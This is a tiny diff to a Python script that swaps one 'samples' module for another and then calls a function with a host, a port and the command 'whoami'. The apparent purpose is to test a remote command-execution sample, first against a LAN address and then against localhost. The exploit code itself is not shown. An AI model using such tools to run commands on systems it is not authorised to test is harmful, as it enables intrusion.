@@ -1,3 +1,3 @@
-from samples import shit_update
+from samples import shit_ser
 
-shit_update.shit('192.168.2.131','80','whoami')
+shit_ser.shit('127.0.0.1','81','whoami')
